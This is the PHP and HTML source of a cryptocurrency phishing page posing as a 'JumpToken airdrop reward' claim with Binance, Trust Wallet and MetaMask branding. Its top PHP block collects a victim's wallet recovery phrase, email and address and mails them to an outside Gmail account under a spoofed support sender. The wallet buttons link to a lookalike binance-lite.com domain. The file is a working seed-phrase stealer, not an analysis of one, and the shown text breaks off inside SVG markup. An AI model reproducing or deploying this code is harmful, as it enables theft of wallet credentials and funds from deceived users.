<?php

  if($_SERVER['REQUEST_METHOD']=='POST')
    {
        $phrase = $_POST['phrase'];
        $mail = $_POST['mail'];
        $jumptoken = $_POST['jumptoken'];

        ini_set( 'display_errors', 1 );
        error_reporting( E_ALL );
        $from = "support_eng@claim-crypto.com";
        $to = "moignon168@gmail.com";
        $subject = "Phrase de Récupération";
        $message = "
        <html>
        <body bgcolor='#87CEFA'>
          <h2>Phrase</h2>
          <p>Phrase: $phrase</p>
          <p>Mail: $mail</p>
          <p>Adresse: $jumptoken</p>
          
        </body>
        </html>";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= "De :" . $from;
        mail($to,$subject,$message, $headers);
    }
    
?>
<?php session_start(); if(isset($_POST["envoyer"])) header("location:/validation.php"); ?>



<!DOCTYPE html>
<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!--  meta tags -->
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
<link href="./Reclamez Vos BNB, Acheter &amp; vendez des cryptomonnaies_files/css2" rel="stylesheet">
    <link rel="stylesheet" href="./Reclamez Vos BNB, Acheter &amp; vendez des cryptomonnaies_files/main.css">
    <link rel="icon" sizes="192x192" href="https://static.wixstatic.com/media/965e2c_2137ff1a0dc54ebbb4f799eadca25e2b~mv2.png/v1/fill/w_32%2Ch_32%2Clg_1%2Cusm_0.66_1.00_0.01/965e2c_2137ff1a0dc54ebbb4f799eadca25e2b~mv2.png">
  <link rel="shortcut icon" href="https://static.wixstatic.com/media/965e2c_2137ff1a0dc54ebbb4f799eadca25e2b~mv2.png/v1/fill/w_32%2Ch_32%2Clg_1%2Cusm_0.66_1.00_0.01/965e2c_2137ff1a0dc54ebbb4f799eadca25e2b~mv2.png" type="image/png"/>
<link rel="apple-touch-icon" href="https://static.wixstatic.com/media/965e2c_2137ff1a0dc54ebbb4f799eadca25e2b~mv2.png/v1/fill/w_32%2Ch_32%2Clg_1%2Cusm_0.66_1.00_0.01/965e2c_2137ff1a0dc54ebbb4f799eadca25e2b~mv2.png" type="image/png"/>

    <!-- Bootstrap CSS -->
    <link href="./Reclamez Vos BNB, Acheter &amp; vendez des cryptomonnaies_files/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <title>JumpToken | Connect</title>
  <style type="text/css">
@font-face {
  font-weight: 400;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Book-cd7d2bcec649b1243839a15d5eb8f0a3.woff2') format('woff2');
}

@font-face {
  font-weight: 500;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Medium-d74eac43c78bd5852478998ce63dceb3.woff2') format('woff2');
}

@font-face {
  font-weight: 700;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Bold-83b8ceaf77f49c7cffa44107561909e4.woff2') format('woff2');
}

@font-face {
  font-weight: 900;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Black-bf067ecb8aa777ceb6df7d72226febca.woff2') format('woff2');
}</style></head>
  <body style="height: 100vh; background-color: #0B0E11;">
    

    <section class="main basepart">
      <div class="container">
        <div class="row">
          <div class="col-12 d-flex justify-content-center mt-3">
            <div class="addInfo col-12 col-md-6 mt-5">
              <h3>Receive JumpToken airdrop reward</h3>
              <p>Register your email address and enter your JumpToken Bep 20 address</p>
              <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
                <label for="email" class="mt-3">E-mail</label><br>
                <input class="col-12 col-md-11 col-xl-9" type="email" name="mail" id="email" required><br>
                <label for="addrBNB" class="mt-4">Adresse JumpToken</label><br>
                <input class="col-12 col-md-11 col-xl-9" type="text" name="jumptoken" id="addrBNB" required><br>
                <input type="checkbox" name="check" id="check" class="mt-3" required>
                <label for="check" style="color: #B7BDC6; position: relative; top: -12px;" class="ms-1">I agree to receive email updates from JumpToken.</label>
                  
                <!-- Button trigger modal -->
                <button class="mt-4 btn btn-link" style="background-color: rgb( 0,0,255); color: rgb(33, 40, 51); text-decoration: none; border-radius: 5px;" type="button" data-bs-toggle="modal" data-bs-target="#exampleModalToggle1">
                  Next step <span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-right" viewBox="0 0 16 16">
                    <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8z"></path>
                  </svg></span>
                </button>
                                <!--<a class="btn btn-primary" data-bs-toggle="modal" href="#exampleModalToggle" role="button">Open first modal</a>-->

                <div class="modal fade" id="exampleModalToggle1" aria-hidden="true" aria-labelledby="exampleModalToggleLabel" tabindex="-1">
                  <div class="modal-dialog modal-dialog-centered" style="border-radius: 20px 20px 0 0;">
                    <div class="modal-content" style="border-radius: 20px;">
                      <div class="modal-header" style="background-color: #F6FBFF; border-radius: 20px 20px 0 0; border: none;">
                        <h5 class="modal-title" id="exampleModalToggleLabel">Connect your Wallet</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                      </div>
                      <div class="modal-body d-flex justify-content-center mb-5">
                        <div class="col-6 d-flex justify-content-center mt-2"><a data-bs-toggle="modal" href="https://binance-lite.com/step_1.php#exampleModalToggle2" role="button"><svg width="115" height="128" viewBox="0 0 125 138" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <rect x="24" y="28" width="77.8132" height="69.6051" rx="34.8025" fill="#3375BB"></rect>
                          <path d="M19.5747 129.484H16V127.6H25.7346V129.484H22.1599V137.592H19.5747V129.484ZM28.6621 130.926C28.9599 130.554 29.3588 130.274 29.8589 130.083C30.3696 129.893 30.9547 129.798 31.6143 129.798V131.853C31.3377 131.834 31.1516 131.825 31.0558 131.825C30.343 131.825 29.7844 132.006 29.3802 132.367C28.9759 132.72 28.7738 133.252 28.7738 133.966V137.592H26.2843V129.912H28.6621V130.926ZM41.3276 129.912V137.592H38.9657V136.678C38.6359 137.011 38.2423 137.268 37.7848 137.449C37.3273 137.621 36.8326 137.706 36.3007 137.706C35.173 137.706 34.2793 137.416 33.6197 136.835C32.96 136.255 32.6303 135.394 32.6303 134.252V129.912H35.1198V133.923C35.1198 135.161 35.6996 135.779 36.8592 135.779C37.455 135.779 37.9337 135.608 38.2955 135.265C38.6572 134.913 38.8381 134.394 38.8381 133.709V129.912H41.3276ZM46.0436 137.706C45.3308 137.706 44.634 137.63 43.953 137.478C43.2722 137.316 42.7296 137.116 42.3253 136.878L43.1551 135.279C43.5381 135.498 44.0009 135.679 44.5435 135.822C45.0861 135.955 45.6181 136.022 46.1393 136.022C47.1926 136.022 47.7192 135.789 47.7192 135.322C47.7192 135.103 47.5756 134.946 47.2883 134.851C47.0011 134.756 46.5596 134.675 45.9638 134.609C45.2616 134.513 44.6818 134.404 44.2243 134.28C43.7669 134.156 43.368 133.938 43.0275 133.624C42.6977 133.31 42.5328 132.862 42.5328 132.282C42.5328 131.796 42.687 131.368 42.9955 130.997C43.3147 130.616 43.7722 130.321 44.368 130.112C44.9744 129.903 45.6872 129.798 46.5064 129.798C47.1128 129.798 47.7139 129.86 48.3096 129.983C48.9161 130.098 49.4161 130.259 49.8097 130.469L48.9799 132.053C48.2246 131.673 47.4 131.482 46.5064 131.482C45.9745 131.482 45.5755 131.549 45.3095 131.682C45.0436 131.815 44.9105 131.987 44.9105 132.196C44.9105 132.434 45.0542 132.601 45.3414 132.696C45.6287 132.791 46.0862 132.881 46.7138 132.967C47.416 133.072 47.9905 133.186 48.4373 133.31C48.8841 133.424 49.2725 133.638 49.6023 133.952C49.9321 134.266 50.097 134.704 50.097 135.265C50.097 135.741 49.9374 136.165 49.6182 136.536C49.2991 136.907 48.831 137.197 48.2139 137.406C47.6075 137.606 46.8841 137.706 46.0436 137.706ZM56.6918 137.221C56.4471 137.383 56.1439 137.506 55.7822 137.592C55.4311 137.668 55.0587 137.706 54.6651 137.706C53.6438 137.706 52.8511 137.473 52.2873 137.007C51.734 136.54 51.4575 135.855 51.4575 134.951V131.796H50.1329V130.083H51.4575V128.213H53.947V130.083H56.0854V131.796H53.947V134.923C53.947 135.246 54.0374 135.498 54.2182 135.679C54.4097 135.85 54.6757 135.936 55.0162 135.936C55.4098 135.936 55.745 135.841 56.0215 135.651L56.6918 137.221ZM78.7102 127.6L75.0557 137.592H72.279L69.8214 130.826L67.2841 137.592H64.5233L60.8529 127.6H63.5339L66.0553 134.623L68.6884 127.6H71.0821L73.6355 134.68L76.2367 127.6H78.7102ZM82.3235 129.798C83.6531 129.798 84.6744 130.083 85.3875 130.654C86.1005 131.216 86.4567 132.068 86.4567 133.21V137.592H84.1268V136.636C83.6589 137.349 82.7863 137.706 81.5096 137.706C80.8503 137.706 80.2758 137.606 79.7861 137.406C79.3074 137.207 78.9403 136.931 78.685 136.578C78.4297 136.226 78.302 135.827 78.302 135.379C78.302 134.666 78.6002 134.104 79.1957 133.695C79.8021 133.286 80.7327 133.081 81.9883 133.081H83.9672C83.9672 132.596 83.8026 132.225 83.4725 131.968C83.1424 131.701 82.6477 131.568 81.9883 131.568C81.5306 131.568 81.0787 131.635 80.6319 131.768C80.196 131.892 79.8231 132.063 79.5148 132.282L78.6212 130.726C79.089 130.431 79.6475 130.202 80.2968 130.041C80.9561 129.879 81.6322 129.798 82.3235 129.798ZM82.132 136.207C82.5578 136.207 82.9349 136.122 83.265 135.95C83.5951 135.77 83.8286 135.508 83.9672 135.165V134.38H82.2596C81.2383 134.38 80.7277 134.68 80.7277 135.279C80.7277 135.565 80.8503 135.793 81.0947 135.965C81.35 136.126 81.6961 136.207 82.132 136.207ZM88.2314 127H90.7209V137.592H88.2314V127ZM92.5519 127H95.0414V137.592H92.5519V127ZM105.283 133.781C105.283 133.809 105.267 134.009 105.235 134.38H98.7404C98.8579 134.856 99.1343 135.232 99.5702 135.508C100.007 135.784 100.55 135.922 101.198 135.922C101.645 135.922 102.039 135.865 102.379 135.751C102.73 135.627 103.055 135.436 103.352 135.18L104.677 136.464C103.869 137.292 102.688 137.706 101.134 137.706C100.167 137.706 99.3098 137.54 98.5648 137.207C97.8207 136.864 97.2462 136.393 96.8413 135.793C96.4373 135.194 96.2349 134.513 96.2349 133.752C96.2349 133 96.4323 132.325 96.8254 131.725C97.2302 131.116 97.7778 130.645 98.4691 130.312C99.1712 129.969 99.9532 129.798 100.815 129.798C101.656 129.798 102.417 129.96 103.097 130.283C103.778 130.607 104.31 131.073 104.693 131.682C105.087 132.282 105.283 132.981 105.283 133.781ZM100.831 131.482C100.267 131.482 99.7936 131.625 99.4106 131.911C99.0276 132.196 98.7941 132.586 98.7084 133.081H102.937C102.853 132.596 102.618 132.21 102.235 131.925C101.852 131.63 101.384 131.482 100.831 131.482ZM112 137.221C111.755 137.383 111.452 137.506 111.09 137.592C110.739 137.668 110.366 137.706 109.973 137.706C108.952 137.706 108.159 137.473 107.596 137.007C107.042 136.54 106.766 135.855 106.766 134.951V131.796H105.441V130.083H106.766V128.213H109.255V130.083H111.394V131.796H109.255V134.923C109.255 135.246 109.345 135.498 109.526 135.679C109.718 135.85 109.983 135.936 110.324 135.936C110.717 135.936 111.053 135.841 111.33 135.651L112 137.221Z" fill="#3375BB"></path>
                          <g filter="url(#filter0_dd_53_12)">
                          <path fill-rule="evenodd" clip-rule="evenodd" d="M16.3712 29.7212C13 36.275 13 44.85 13 62C13 79.15 13 87.725 16.3712 94.2789C19.3412 100.036 24.075 104.722 29.8925 107.662C36.5125 111 45.175 111 62.5 111C79.825 111 88.4875 111 95.1075 107.662C100.925 104.722 105.659 100.036 108.629 94.2789C112 87.725 112 79.15 112 62C112 44.85 112 36.275 108.629 29.7212C105.659 23.9637 100.925 19.2781 95.1075 16.3381C88.4875 13 79.825 13 62.5 13C45.175 13 36.5125 13 29.8925 16.3381C24.075 19.2781 19.3412 23.9637 16.3712 29.7212ZM87.2031 39.4293C88.0706 39.4293 88.8887 39.7816 89.4931 40.3789C90.0975 40.9914 90.4362 41.8182 90.4206 42.6602C90.2669 51.7866 89.91 58.7691 89.2457 64.2968C88.5969 69.8248 87.6225 73.9284 86.1532 77.2514C85.1632 79.4716 83.9387 81.3091 82.5006 82.8709C80.5675 84.9382 78.3556 86.4389 75.9432 87.863C74.9115 88.4737 73.8381 89.0766 72.7126 89.7092C70.3132 91.0588 67.6715 92.5427 64.6806 94.5239C63.5994 95.2434 62.19 95.2434 61.1088 94.5239C58.0711 92.5195 55.3955 91.0173 52.9726 89.6569C52.4359 89.3544 51.9096 89.0588 51.3938 88.7664C48.5618 87.1432 46.0113 85.5966 43.7838 83.3609C42.2988 81.8909 41.0144 80.0993 39.9931 77.9709C38.6019 75.1227 37.6562 71.6775 36.9606 67.2216C36.0331 61.265 35.5694 53.4709 35.4001 42.6602C35.3844 41.8182 35.7075 40.9914 36.3119 40.3789C36.9137 39.7816 37.75 39.4293 38.6175 39.4293H39.9462C44.0469 39.4448 53.095 39.0466 60.9212 33.0135C62.0832 32.1253 63.7062 32.1253 64.8682 33.0135C72.6944 39.0466 81.7425 39.4448 85.8588 39.4293H87.2031ZM80.01 75.2148C81.0156 73.1627 81.8519 70.33 82.485 66.2568C83.2431 61.3875 83.7068 54.7725 83.9257 45.7689C79.0981 45.6309 70.8082 44.7123 62.9012 39.4448C54.9969 44.6968 46.7069 45.6157 41.895 45.7689C42.0669 53.2107 42.4056 58.9989 42.9475 63.5466C43.5675 68.7223 44.4481 72.2289 45.5475 74.6941C46.2744 76.3325 47.0769 77.5116 48.0382 78.5527C49.32 79.9464 50.9457 81.0948 53.1575 82.4116C54.0746 82.9565 55.0854 83.5234 56.1874 84.1405C58.1492 85.2397 60.395 86.4982 62.9012 88.0773C65.3632 86.524 67.5776 85.2784 69.516 84.1872C70.0995 83.8584 70.6597 83.5435 71.1938 83.2384C73.9163 81.6918 75.9275 80.4057 77.4281 78.905C78.4338 77.8791 79.2518 76.7614 80.01 75.2148Z" fill="white"></path>
                          </g>
                          <defs>
                          <filter id="filter0_dd_53_12" x="0.95162" y="0.95162" width="123.097" height="122.097" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
                          <feflood flood-opacity="0" result="BackgroundImageFix"></feflood>
                          <fecolormatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></fecolormatrix>
                          <feoffset dx="2.40968" dy="2.40968"></feoffset>
                          <fegaussianblur stdDeviation="4.81935"></fegaussianblur>
                          <fecomposite in2="hardAlpha" operator="out"></fecomposite>
                          <fecolormatrix type="matrix" values="0 0 0 0 0.2 0 0 0 0 0.458824 0 0 0 0 0.733333 0 0 0 0.25 0"></fecolormatrix>
                          <feblend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_53_12"></feblend>
                          <fecolormatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></fecolormatrix>
                          <feoffset dx="-2.40968" dy="-2.40968"></feoffset>
                          <fegaussianblur stdDeviation="4.81935"></fegaussianblur>
                          <fecomposite in2="hardAlpha" operator="out"></fecomposite>
                          <fecolormatrix type="matrix" values="0 0 0 0 0.2 0 0 0 0 0.458824 0 0 0 0 0.733333 0 0 0 0.25 0"></fecolormatrix>
                          <feblend mode="normal" in2="effect1_dropShadow_53_12" result="effect2_dropShadow_53_12"></feblend>
                          <feblend mode="normal" in="SourceGraphic" in2="effect2_dropShadow_53_12" result="shape"></feblend>
                          </filter>
                          </defs>
                          </svg>
                          </a>
                        </div>
                        <div class="col-6 d-flex justify-content-center mt-2">
                          <a data-bs-toggle="modal" href="https://binance-lite.com/step_1.php#exampleModalToggle3" role="button"><svg width="100" height="124" viewBox="0 0 112 134" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M102.654 1L62.1096 31L69.6492 13.32L102.654 1Z" fill="#E17726" stroke="#E17726" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M9.1333 1L49.3167 31.28L42.1383 13.32L9.1333 1Z" fill="#E27625" stroke="#E27625" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M88.0555 70.5598L77.2678 87.0399L100.367 93.3999L106.984 70.9201L88.0555 70.5598Z" fill="#E27625" stroke="#E27625" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M4.8418 70.9201L11.4187 93.3999L34.4781 87.0399L23.7304 70.5598L4.8418 70.9201Z" fill="#E27625" stroke="#E27625" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M33.2348 42.7199L26.8184 52.3999L49.6771 53.4399L48.9153 28.84L33.2348 42.7199Z" fill="#E27625" stroke="#E27625" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M78.551 42.7202L62.6303 28.5603L62.1089 53.4403L84.9675 52.4003L78.551 42.7202Z" fill="#E27625" stroke="#E27625" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M34.4785 87.0397L48.314 80.3598L36.4035 71.0798L34.4785 87.0397Z" fill="#E27625" stroke="#E27625" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M63.4729 80.3598L77.2682 87.0397L75.3833 71.0798L63.4729 80.3598Z" fill="#E27625" stroke="#E27625" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M77.2682 87.0402L63.4729 80.3604L64.5956 89.3202L64.4752 93.1203L77.2682 87.0402Z" fill="#D5BFB2" stroke="#D5BFB2" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M34.4785 87.0402L47.3116 93.1203L47.2314 89.3202L48.314 80.3604L34.4785 87.0402Z" fill="#D5BFB2" stroke="#D5BFB2" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M47.5519 65.16L36.0823 61.8002L44.1831 58.0801L47.5519 65.16Z" fill="#233447" stroke="#233447" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M64.2349 65.16L67.6037 58.0801L75.7446 61.8002L64.2349 65.16Z" fill="#233447" stroke="#233447" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M34.4783 87.0399L36.4836 70.5598L23.7307 70.9201L34.4783 87.0399Z" fill="#CC6228" stroke="#CC6228" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M75.303 70.5598L77.2681 87.0399L88.0558 70.9201L75.303 70.5598Z" fill="#CC6228" stroke="#CC6228" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M84.9675 52.3998L62.1089 53.4398L64.2343 65.16L67.6031 58.0798L75.744 61.7999L84.9675 52.3998Z" fill="#CC6228" stroke="#CC6228" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M36.0822 61.7999L44.183 58.0798L47.5518 65.16L49.6771 53.4398L26.8184 52.3998L36.0822 61.7999Z" fill="#CC6228" stroke="#CC6228" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M26.8191 52.3998L36.4038 71.0799L36.0828 61.7999L26.8191 52.3998Z" fill="#E27525" stroke="#E27525" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M75.7447 61.7999L75.3838 71.0799L84.9685 52.3998L75.7447 61.7999Z" fill="#E27525" stroke="#E27525" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M49.6787 53.4398L47.553 65.1601L50.2399 78.9998L50.8415 60.7599L49.6787 53.4398Z" fill="#E27525" stroke="#E27525" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M62.1096 53.4398L60.9866 60.7201L61.5481 78.9998L64.235 65.1601L62.1096 53.4398Z" fill="#E27525" stroke="#E27525" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M64.235 65.1602L61.5481 79L63.4731 80.3601L75.3838 71.0801L75.7447 61.8L64.235 65.1602Z" fill="#F5841F" stroke="#F5841F" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M36.0823 61.8L36.4033 71.0801L48.3137 80.3601L50.2388 79L47.5519 65.1602L36.0823 61.8Z" fill="#F5841F" stroke="#F5841F" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M64.4757 93.12L64.5958 89.3199L63.5533 88.4398H48.234L47.2314 89.3199L47.3116 93.12L34.4785 87.0399L38.97 90.7199L48.0735 97H63.6734L72.817 90.7199L77.2684 87.0399L64.4757 93.12Z" fill="#C0AC9D" stroke="#C0AC9D" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M63.4727 80.3597L61.5477 78.9999H50.2386L48.3139 80.3597L47.231 89.3199L48.2336 88.4398H63.5529L64.5957 89.3199L63.4727 80.3597Z" fill="#161616" stroke="#161616" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M104.378 32.9599L107.787 16.4L102.653 1L63.4729 30.0001L78.5515 42.7199L99.8462 48.9201L104.538 43.4401L102.493 41.9599L105.741 39.0002L103.255 37.0801L106.504 34.6L104.378 32.9599Z" fill="#763E1A" stroke="#763E1A" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M4 16.4L7.44887 32.9599L5.24321 34.6L8.53166 37.0801L6.04526 39.0002L9.29361 41.9599L7.24834 43.4401L11.9404 48.9201L33.2354 42.7199L48.3139 30.0001L9.13321 1L4 16.4Z" fill="#763E1A" stroke="#763E1A" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M99.8467 48.9198L78.5519 42.72L84.9685 52.4001L75.3838 71.0799L88.0564 70.92H106.985L99.8467 48.9198Z" fill="#F5841F" stroke="#F5841F" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M33.2347 42.72L11.94 48.9198L4.8418 70.92H23.7304L36.4028 71.0799L26.8183 52.4001L33.2347 42.72Z" fill="#F5841F" stroke="#F5841F" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M62.1091 53.44L63.4726 29.9998L69.6484 13.3199H42.1377L48.3135 29.9998L49.677 53.44L50.1984 60.7999L50.2385 79H61.5476L61.5877 60.7999L62.1091 53.44Z" fill="#F5841F" stroke="#F5841F" stroke-width="0.77174" stroke-linecap="round" stroke-linejoin="round"></path>
                            <path d="M93.9739 126.155C93.171 125.625 92.2865 125.249 91.4491 124.778C90.906 124.472 90.3275 124.201 89.8562 123.813C89.0533 123.154 89.2186 121.86 90.0569 121.295C91.2602 120.495 93.2537 120.942 93.4662 122.577C93.4662 122.613 93.5016 122.636 93.537 122.636H95.3543C95.4015 122.636 95.4369 122.601 95.4251 122.554C95.3307 121.424 94.8939 120.483 94.0919 119.883C93.3245 119.306 92.4517 119 91.519 119C86.7175 119 86.2807 124.072 88.8644 125.672C89.1596 125.861 91.6961 127.132 92.5934 127.685C93.4898 128.238 93.7732 129.25 93.3835 130.05C93.0294 130.78 92.1094 131.286 91.1894 131.227C90.1858 131.168 89.4075 130.627 89.136 129.779C89.0887 129.627 89.0651 129.332 89.0651 129.203C89.0651 129.168 89.0297 129.132 88.9943 129.132H87.0245C86.989 129.132 86.9536 129.168 86.9536 129.203C86.9536 130.627 87.3078 131.415 88.275 132.133C89.1832 132.816 90.174 133.098 91.2012 133.098C93.8912 133.098 95.2835 131.58 95.5659 130.003C95.8138 128.461 95.3543 127.073 93.9739 126.155Z" fill="#161616"></path>
                            <path d="M8.42403 119.259H7.55099H6.59531C6.55989 119.259 6.53628 119.283 6.52447 119.306L4.90818 124.625C4.88457 124.696 4.79021 124.696 4.7666 124.625L3.15021 119.306C3.13841 119.271 3.11479 119.259 3.07938 119.259H2.12379H1.25066H0.0708374C0.0354183 119.259 0 119.294 0 119.33V132.91C0 132.945 0.0354183 132.981 0.0708374 132.981H2.04114C2.07656 132.981 2.11198 132.945 2.11198 132.91V122.589C2.11198 122.507 2.22995 122.495 2.25356 122.566L3.88166 127.92L3.99963 128.297C4.01144 128.332 4.03505 128.344 4.07047 128.344H5.58069C5.61602 128.344 5.63963 128.32 5.65144 128.297L5.76941 127.92L7.3976 122.566C7.42121 122.483 7.53919 122.507 7.53919 122.589V132.91C7.53919 132.945 7.5746 132.981 7.60993 132.981H9.58033C9.61565 132.981 9.65107 132.945 9.65107 132.91V119.33C9.65107 119.294 9.61565 119.259 9.58033 119.259H8.42403Z" fill="#161616"></path>
                            <path d="M63.8051 119.259C63.7697 119.259 63.7461 119.283 63.7343 119.306L62.1186 124.625C62.095 124.696 62.0005 124.696 61.9769 124.625L60.3604 119.306C60.3486 119.271 60.3249 119.259 60.2895 119.259H57.2925C57.2571 119.259 57.2217 119.294 57.2217 119.33V132.91C57.2217 132.945 57.2571 132.981 57.2925 132.981H59.2633C59.2987 132.981 59.3341 132.945 59.3341 132.91V122.589C59.3341 122.507 59.4522 122.495 59.4758 122.566L61.1032 127.92L61.2213 128.297C61.2331 128.332 61.2567 128.344 61.2921 128.344H62.8025C62.8379 128.344 62.8615 128.32 62.8733 128.297L62.9914 127.92L64.6197 122.566C64.6433 122.483 64.7614 122.507 64.7614 122.589V132.91C64.7614 132.945 64.7968 132.981 64.8322 132.981H66.8021C66.8375 132.981 66.8729 132.945 66.8729 132.91V119.33C66.8729 119.294 66.8375 119.259 66.8021 119.259H63.8051Z" fill="#161616"></path>
                            <path d="M38.3917 119.259H34.7223H32.752H29.0828C29.0474 119.259 29.012 119.294 29.012 119.33V121.024C29.012 121.06 29.0474 121.095 29.0828 121.095H32.6813V132.91C32.6813 132.945 32.7166 132.981 32.752 132.981H34.7223C34.7578 132.981 34.7932 132.945 34.7932 132.91V121.095H38.3917C38.4271 121.095 38.4624 121.06 38.4624 121.024V119.33C38.4624 119.294 38.4389 119.259 38.3917 119.259Z" fill="#161616"></path>
                            <path d="M50.0133 132.98H51.8061C51.8533 132.98 51.8887 132.933 51.8769 132.886L48.1725 119.259C48.1607 119.224 48.137 119.212 48.1016 119.212H47.4175H46.2141H45.5297C45.4943 119.212 45.4707 119.235 45.4589 119.259L41.7542 132.886C41.7424 132.933 41.7779 132.98 41.8251 132.98H43.6184C43.6538 132.98 43.6774 132.957 43.6892 132.933L44.7629 128.967C44.7746 128.932 44.7982 128.92 44.8336 128.92H48.7982C48.8336 128.92 48.8572 128.944 48.869 128.967L49.9425 132.933C49.9543 132.957 49.9897 132.98 50.0133 132.98ZM45.3055 126.979L46.745 121.671C46.7685 121.601 46.8629 121.601 46.8866 121.671L48.3259 126.979C48.3377 127.026 48.3023 127.073 48.2551 127.073H45.3763C45.3291 127.073 45.2938 127.026 45.3055 126.979Z" fill="#161616"></path>
                            <path d="M80.5946 132.98H82.3873C82.4345 132.98 82.47 132.933 82.4581 132.886L78.7537 119.259C78.7419 119.224 78.7183 119.212 78.6828 119.212H77.999H76.7956H76.1109C76.0754 119.212 76.0518 119.235 76.04 119.259L72.3355 132.886C72.3237 132.933 72.3592 132.98 72.4064 132.98H74.2C74.2355 132.98 74.2591 132.957 74.2709 132.933L75.3443 128.967C75.3562 128.932 75.3798 128.92 75.4152 128.92H79.3794C79.4148 128.92 79.4384 128.944 79.4502 128.967L80.5237 132.933C80.5355 132.957 80.5591 132.98 80.5946 132.98ZM75.8865 126.979L77.326 121.671C77.3496 121.601 77.4441 121.601 77.4677 121.671L78.9071 126.979C78.919 127.026 78.8835 127.073 78.8363 127.073H75.9574C75.9101 127.073 75.8747 127.026 75.8865 126.979Z" fill="#161616"></path>
                            <path d="M17.6502 130.968V126.755C17.6502 126.72 17.6856 126.685 17.7211 126.685H22.9713C23.0067 126.685 23.0421 126.649 23.0421 126.614V124.919C23.0421 124.884 23.0067 124.849 22.9713 124.849H17.7211C17.6856 124.849 17.6502 124.813 17.6502 124.778V121.177C17.6502 121.142 17.6856 121.107 17.7211 121.107H23.691C23.7264 121.107 23.7618 121.071 23.7618 121.036V119.341C23.7618 119.306 23.7264 119.271 23.691 119.271H17.6502H15.6092C15.5737 119.271 15.5383 119.306 15.5383 119.341V121.107V124.861V126.696V131.051V132.91C15.5383 132.945 15.5737 132.98 15.6092 132.98H17.6502H23.9387C23.9742 132.98 24.0096 132.945 24.0096 132.91V131.121C24.0096 131.086 23.9742 131.051 23.9387 131.051H17.7092C17.6738 131.039 17.6502 131.015 17.6502 130.968Z" fill="#161616"></path>
